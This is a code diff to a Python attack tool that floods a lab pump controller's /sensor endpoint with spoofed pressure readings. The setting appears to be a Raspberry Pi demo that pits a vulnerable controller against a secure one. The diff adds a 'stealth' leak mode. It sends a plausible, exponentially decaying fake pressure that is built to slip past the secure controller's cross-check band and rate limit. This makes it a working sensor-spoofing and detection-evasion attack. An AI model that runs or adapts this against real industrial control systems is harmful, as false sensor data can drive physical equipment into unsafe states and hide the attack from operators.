@@ -12,6 +12,7 @@ Target: Pi #7 (Vulnerable System) - 192.168.50.100 (VLAN2)
 """
 
 import time
+import math
 import requests
 import argparse
 import threading
@@ -35,7 +36,23 @@ DUAL_TARGETS = [
     }
 ]
 
-def attack_continuous(target_url, fake_pressure=0.0, interval=0.1):
+def compute_pressure(fake_pressure, leak, t0):
+    """Pressure to send right now.
+
+    Returns the constant `fake_pressure`, unless leak=(start, floor, tau): then a
+    fake "leak" that decays exponentially from start PSI toward floor PSI with
+    time-constant tau seconds, measured from t0. This still drives the vulnerable
+    pump (floor is below the 25 PSI setpoint) but looks like a plausible slow leak
+    instead of a flat 0.0 — and while it stays within the secure controller's
+    cross-check band and under its rate limit, it's a stealthier probe that only
+    the HMAC signature check stops.
+    """
+    if not leak:
+        return fake_pressure
+    start, floor, tau = leak
+    return round(floor + (start - floor) * math.exp(-(time.time() - t0) / tau), 2)
+
+def attack_continuous(target_url, fake_pressure=0.0, interval=0.1, leak=None):
     """
     Continuously flood the system with fake sensor readings
 
@@ -50,7 +67,10 @@ def attack_continuous(target_url, fake_pressure=0.0, interval=0.1):
     print("PRESSURE SENSOR SPOOFING ATTACK")
     print("=" * 60)
     print(f"Target: {sensor_endpoint}")
-    print(f"Fake Pressure: {fake_pressure} PSI")
+    if leak:
+        print(f"Fake Pressure: LEAK mode - {leak[0]} → {leak[1]} PSI, tau={leak[2]}s")
+    else:
+        print(f"Fake Pressure: {fake_pressure} PSI")
     print(f"Attack Rate: {1/interval:.1f} requests/second")
     print("=" * 60)
     print("\n⚠️  ATTACK IN PROGRESS")
@@ -62,13 +82,15 @@ def attack_continuous(target_url, fake_pressure=0.0, interval=0.1):
     attack_count = 0
     success_count = 0
     error_count = 0
+    t0 = time.time()
 
     try:
         while True:
+            p = compute_pressure(fake_pressure, leak, t0)
             try:
                 # Craft malicious payload
                 payload = {
-                    "pressure": fake_pressure,
+                    "pressure": p,
                     "temperature": 25.0,
                     "timestamp": datetime.now().isoformat(),
                     "source": "attacker",  # ⚠️ System doesn't validate this!
@@ -88,7 +110,7 @@ def attack_continuous(target_url, fake_pressure=0.0, interval=0.1):
                     success_count += 1
                     result = response.json()
                     print(f"[{datetime.now().strftime('%H:%M:%S')}] "
-                          f"✓ Spoofed: {fake_pressure} PSI "
+                          f"✓ Spoofed: {p} PSI "
                           f"(Accepted: {success_count}/{attack_count}, "
                           f"Failures: {error_count})")
                 else:
@@ -123,19 +145,20 @@ def attack_continuous(target_url, fake_pressure=0.0, interval=0.1):
         print("  Balloon likely over-inflated and popped")
         print("=" * 60)
 
-def attack_single(target_url, fake_pressure=0.0):
+def attack_single(target_url, fake_pressure=0.0, leak=None):
     """Send a single spoofed sensor reading"""
     sensor_endpoint = f"{target_url}/sensor"
 
+    p = compute_pressure(fake_pressure, leak, time.time())
     payload = {
-        "pressure": fake_pressure,
+        "pressure": p,
         "temperature": 25.0,
         "timestamp": datetime.now().isoformat(),
         "source": "attacker-single",
         "sensor_type": "spoofed"
     }
 
-    print(f"Sending single spoofed reading: {fake_pressure} PSI")
+    print(f"Sending single spoofed reading: {p} PSI")
     response = requests.post(sensor_endpoint, json=payload, timeout=2)
 
     if response.status_code == 200:
@@ -143,7 +166,7 @@ def attack_single(target_url, fake_pressure=0.0):
     else:
         print(f"✗ Attack failed: HTTP {response.status_code}")
 
-def attack_target_thread(target, fake_pressure, interval, stop_event, stats, stats_lock):
+def attack_target_thread(target, fake_pressure, interval, stop_event, stats, stats_lock, leak=None, t0=None):
     """
     Attack a single target continuously until stop_event is set
 
@@ -158,11 +181,14 @@ def attack_target_thread(target, fake_pressure, interval, stop_event, stats, sta
     sensor_endpoint = f"{target['url']}/sensor"
     name = target['name']
 
+    if t0 is None:
+        t0 = time.time()
     while not stop_event.is_set():
+        p = compute_pressure(fake_pressure, leak, t0)
         try:
             # Craft malicious payload
             payload = {
-                "pressure": fake_pressure,
+                "pressure": p,
                 "temperature": 25.0,
                 "timestamp": datetime.now().isoformat(),
                 "source": "attacker",
@@ -178,6 +204,7 @@ def attack_target_thread(target, fake_pressure, interval, stop_event, stats, sta
 
             with stats_lock:
                 stats[name]["total"] += 1
+                stats[name]["last"] = p
 
                 if response.status_code == 200:
                     stats[name]["success"] += 1
@@ -199,7 +226,7 @@ def attack_target_thread(target, fake_pressure, interval, stop_event, stats, sta
 
         time.sleep(interval)
 
-def attack_dual(fake_pressure=0.0, interval=0.1):
+def attack_dual(fake_pressure=0.0, interval=0.1, leak=None):
     """
     Continuously attack both vulnerable and secure systems simultaneously
 
@@ -210,7 +237,10 @@ def attack_dual(fake_pressure=0.0, interval=0.1):
     print("=" * 80)
     print("DUAL-TARGET PRESSURE SENSOR SPOOFING ATTACK")
     print("=" * 80)
-    print(f"Fake Pressure: {fake_pressure} PSI")
+    if leak:
+        print(f"Fake Pressure: LEAK mode - {leak[0]} → {leak[1]} PSI, tau={leak[2]}s")
+    else:
+        print(f"Fake Pressure: {fake_pressure} PSI")
     print(f"Attack Rate: {1/interval:.1f} requests/second PER TARGET")
     print(f"Total Rate: {2/interval:.1f} requests/second COMBINED")
     print("=" * 80)
@@ -229,16 +259,17 @@ def attack_dual(fake_pressure=0.0, interval=0.1):
     print("-" * 80)
 
     # Statistics per target
-    stats = defaultdict(lambda: {"success": 0, "error": 0, "total": 0})
+    stats = defaultdict(lambda: {"success": 0, "error": 0, "total": 0, "last": fake_pressure})
     stats_lock = threading.Lock()
     stop_event = threading.Event()
+    t0 = time.time()
 
     # Start attack threads for each target
     threads = []
     for target in DUAL_TARGETS:
         thread = threading.Thread(
             target=attack_target_thread,
-            args=(target, fake_pressure, interval, stop_event, stats, stats_lock),
+            args=(target, fake_pressure, interval, stop_event, stats, stats_lock, leak, t0),
             daemon=True
         )
         thread.start()
@@ -250,6 +281,8 @@ def attack_dual(fake_pressure=0.0, interval=0.1):
             # Print status line
             with stats_lock:
                 status_parts = [f"[{datetime.now().strftime('%H:%M:%S')}]"]
+                if leak:
+                    status_parts.append(f"leak≈{compute_pressure(fake_pressure, leak, t0):.1f} PSI")
 
                 for target in DUAL_TARGETS:
                     name = target['name']
@@ -395,8 +428,32 @@ def main():
         action='store_true',
         help='Check if target(s) are reachable and exit'
     )
+    parser.add_argument(
+        '--leak',
+        action='store_true',
+        help='Stealth mode: send a fake exponential "leak" curve instead of a constant pressure'
+    )
+    parser.add_argument(
+        '--leak-start',
+        type=float,
+        default=25.0,
+        help='LEAK mode: starting PSI (default: 25.0)'
+    )
+    parser.add_argument(
+        '--leak-floor',
+        type=float,
+        default=10.0,
+        help='LEAK mode: PSI the leak settles toward (default: 10.0)'
+    )
+    parser.add_argument(
+        '--leak-tau',
+        type=float,
+        default=2.5,
+        help='LEAK mode: decay time-constant in seconds, bigger = slower (default: 2.5)'
+    )
 
     args = parser.parse_args()
+    leak = (args.leak_start, args.leak_floor, args.leak_tau) if args.leak else None
 
     # Add http:// if no scheme provided (single target mode only)
     if not args.dual:
@@ -416,7 +473,7 @@ def main():
                 return 0
 
         # Execute dual attack
-        attack_dual(args.pressure, args.rate)
+        attack_dual(args.pressure, args.rate, leak)
         return 0
 
     # Single target mode
@@ -430,9 +487,9 @@ def main():
 
         # Execute attack
         if args.continuous:
-            attack_continuous(args.target, args.pressure, args.rate)
+            attack_continuous(args.target, args.pressure, args.rate, leak)
         else:
-            attack_single(args.target, args.pressure)
+            attack_single(args.target, args.pressure, leak)
 
         return 0
 
